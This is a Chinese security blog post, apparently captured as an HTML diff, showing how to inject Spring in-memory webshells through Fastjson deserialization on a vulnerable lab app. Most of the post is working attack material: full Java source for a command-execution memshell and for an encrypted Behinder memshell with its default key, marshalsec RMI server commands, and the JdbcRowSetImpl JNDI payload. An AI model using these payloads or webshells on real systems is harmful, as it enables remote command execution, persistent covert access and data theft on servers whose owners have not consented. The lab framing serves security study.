@@ -1,0 +1,520 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sp4z">
+  <meta name="keywords" content="">
+  
+  <title>Fastjson+Spring环境注入冰蝎和Neo-regeorg内存马 - sp4z&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Fastjson+Spring环境注入冰蝎和Neo-regeorg内存马">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-01-24 13:33" pubdate>
+        2022年1月24日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      51
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Fastjson+Spring环境注入冰蝎和Neo-regeorg内存马</h1>
+            
+            <div class="markdown-body">
+              <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>使用这个java漏洞靶场进行测试</p>
+<p><a href="https://github.com/tangxiaofeng7/SecExample">https://github.com/tangxiaofeng7/SecExample</a></p>
+<p>漏洞代码</p>
+<p><a href="https://imgtu.com/i/7omoOe"><img src="https://s4.ax1x.com/2022/01/24/7omoOe.png" srcset="/img/loading.gif" lazyload alt="7omoOe.png"></a></p>
+<h1 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h1><p>用idea编译好</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mem</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Mem</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.<br>                currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 通过反射获得自定义 controller 中唯一的 Method 对象</span><br>        Method method = Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getMappingRegistry&quot;</span>);<br>        <span class="hljs-comment">// 属性被 private 修饰，所以 setAccessible true</span><br>        method.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 通过反射获得该类的test方法</span><br>        Method method2 = Mem.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-comment">// 定义该controller的path</span><br>        PatternsRequestCondition url = <span class="hljs-keyword">new</span> PatternsRequestCondition(<span class="hljs-string">&quot;/memshell&quot;</span>);<br>        <span class="hljs-comment">// 定义允许访问的HTTP方法</span><br>        RequestMethodsRequestCondition ms = <span class="hljs-keyword">new</span> RequestMethodsRequestCondition();<br>        <span class="hljs-comment">// 在内存中动态注册 controller</span><br>        RequestMappingInfo info = <span class="hljs-keyword">new</span> RequestMappingInfo(url, ms, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        <span class="hljs-comment">// 创建用于处理请求的对象，避免无限循环使用另一个构造方法</span><br>        Mem injectToController = <span class="hljs-keyword">new</span> Mem(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">// 将该controller注册到Spring容器</span><br>        mappingHandlerMapping.registerMapping(info, injectToController, method2);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Mem</span><span class="hljs-params">(String aaa)</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">// 获取request和response对象</span><br>        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br><br>        <span class="hljs-comment">//exec</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            String arg0 = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            PrintWriter writer = response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-keyword">null</span>) &#123;<br>                String o = <span class="hljs-string">&quot;&quot;</span>;<br>                java.lang.ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> java.lang.ProcessBuilder(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> java.lang.ProcessBuilder(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br>                java.util.Scanner c = <span class="hljs-keyword">new</span> java.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next(): o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span><br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>    &#125;<br><br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>进入项目下的target\classes文件夹，开启web服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> -m SimpleHTTPServer <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/7omwWV"><img src="https://s4.ax1x.com/2022/01/24/7omwWV.png" srcset="/img/loading.gif" lazyload alt="7omwWV.png"></a></p>
+<p>开启rmi</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://127.0.0.1:8888/#Mem&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/7omDQU"><img src="https://s4.ax1x.com/2022/01/24/7omDQU.png" srcset="/img/loading.gif" lazyload alt="7omDQU.png"></a></p>
+<p>利用</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-attr">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:9999/Mem&quot;</span>,<br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/7omsL4"><img src="https://s4.ax1x.com/2022/01/24/7omsL4.png" srcset="/img/loading.gif" lazyload alt="7omsL4.png"></a></p>
+<p>成功注入</p>
+<p><a href="https://imgtu.com/i/7om0zT"><img src="https://s4.ax1x.com/2022/01/24/7om0zT.png" srcset="/img/loading.gif" lazyload alt="7om0zT.png"></a></p>
+<h1 id="注入冰蝎"><a href="#注入冰蝎" class="headerlink" title="注入冰蝎"></a>注入冰蝎</h1><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>只需要在test方法里实现冰蝎jsp马的功能就可以</p>
+<p>直接把jsp代码复制到test方法中，发现报了两个错误，缺少session对象和pageContext对象。我们可以直接从已有的request对象中获取session对象，加上一段即可<code>HttpSession session=request.getSession();</code>。pageContext是jsp内置对象，在spring中不存在</p>
+<p><a href="https://imgtu.com/i/7omcw9"><img src="https://s4.ax1x.com/2022/01/24/7omcw9.png" srcset="/img/loading.gif" lazyload alt="7omcw9.png"></a></p>
+<p>先了解一下冰蝎jsp马的原理：</p>
+<ol>
+<li>服务端接收客户端发送的加密后的字节码数据，进行Base64+AES解码</li>
+<li>得到对应的Payload的类后，用自定义的ClassLoader（U）加载字节码，进行<code>newInstance</code>实例化</li>
+<li>调用Payload类的<code>equals</code>方法，并且传入<code>pageContext</code>作为参数（pageContext用于获取response对象以便在页面上输出执行的结果）</li>
+</ol>
+<p><a href="https://imgtu.com/i/7om6eJ"><img src="https://s4.ax1x.com/2022/01/24/7om6eJ.png" srcset="/img/loading.gif" lazyload alt="7om6eJ.png"></a></p>
+<p>查看冰蝎11客户端的源码</p>
+<p>左边有一堆的Payload类，分别对应不同功能，是发送到服务端让目标机器执行的。先以BasicInfo这个获取基本信息的payload类为例，了解其工作流程，别的类也大同小异。</p>
+<p>通过对jsp文件的分析，可知equals方法是所有payload类的入口，先从equals方法看起。发现调用了<code>fillContext</code>方法，注意这里没有限制equals方法的参数类型必须为pageContext</p>
+<p><a href="https://imgtu.com/i/7omgoR"><img src="https://s4.ax1x.com/2022/01/24/7omgoR.png" srcset="/img/loading.gif" lazyload alt="7omgoR.png"></a></p>
+<p>再查看<code>fillContext</code>方法，发现在没有PageContext的情况下，只需要传入一个包含session，response、request的<code>Map&lt;String,Object&gt;</code>对象就可以了，这个我们可以自己构造出来</p>
+<p><a href="https://imgtu.com/i/7omryF"><img src="https://s4.ax1x.com/2022/01/24/7omryF.png" srcset="/img/loading.gif" lazyload alt="7omryF.png"></a></p>
+<p>修改一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MemBehinder</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MemBehinder</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.<br>                currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 通过反射获得自定义 controller 中唯一的 Method 对象</span><br>        Method method = Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getMappingRegistry&quot;</span>);<br>        <span class="hljs-comment">// 属性被 private 修饰，所以 setAccessible true</span><br>        method.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 通过反射获得该类的test方法</span><br>        Method method2 = MemBehinder.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-comment">// 定义该controller的path</span><br>        PatternsRequestCondition url = <span class="hljs-keyword">new</span> PatternsRequestCondition(<span class="hljs-string">&quot;/memshell&quot;</span>);<br>        <span class="hljs-comment">// 定义允许访问的HTTP方法</span><br>        RequestMethodsRequestCondition ms = <span class="hljs-keyword">new</span> RequestMethodsRequestCondition();<br>        <span class="hljs-comment">// 在内存中动态注册 controller</span><br>        RequestMappingInfo info = <span class="hljs-keyword">new</span> RequestMappingInfo(url, ms, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        <span class="hljs-comment">// 创建用于处理请求的对象，避免无限循环使用另一个构造方法</span><br>        MemBehinder injectToController = <span class="hljs-keyword">new</span> MemBehinder(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">// 将该controller注册到Spring容器</span><br>        mappingHandlerMapping.registerMapping(info, injectToController, method2);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">MemBehinder</span><span class="hljs-params">(String aaa)</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">// 获取request和response对象</span><br>        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br>        HttpSession session=request.getSession();<br><br>        <span class="hljs-comment">//exec</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br>                U(ClassLoader c)<br>                &#123;<br>                    <span class="hljs-keyword">super</span>(c);<br>                &#125;<br>                <span class="hljs-function"><span class="hljs-keyword">public</span> Class <span class="hljs-title">g</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> []b)</span></span><br><span class="hljs-function">                </span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);<br>                &#125;<br>            &#125;<br><br>            String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br>            session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);<br>            Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> SecretKeySpec(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<br><br>            Map&lt;String,Object&gt; obj=<span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>            obj.put(<span class="hljs-string">&quot;session&quot;</span>,session);<br>            obj.put(<span class="hljs-string">&quot;response&quot;</span>,response);<br>            obj.put(<span class="hljs-string">&quot;request&quot;</span>,request);<br><br>            <span class="hljs-keyword">new</span> U(<span class="hljs-keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(obj);<br><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><p>进入项目下的target\classes文件夹，开启web服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> -m SimpleHTTPServer <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>开启rmi</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://127.0.0.1:8888/#MemBehinder&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>利用</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-attr">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:9999/MemBehinder&quot;</span>,<br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/7omRF1"><img src="https://s4.ax1x.com/2022/01/24/7omRF1.png" srcset="/img/loading.gif" lazyload alt="7omRF1.png"></a></p>
+<p>访问页面</p>
+<p><a href="https://imgtu.com/i/7om4SK"><img src="https://s4.ax1x.com/2022/01/24/7om4SK.png" srcset="/img/loading.gif" lazyload alt="7om4SK.png"></a></p>
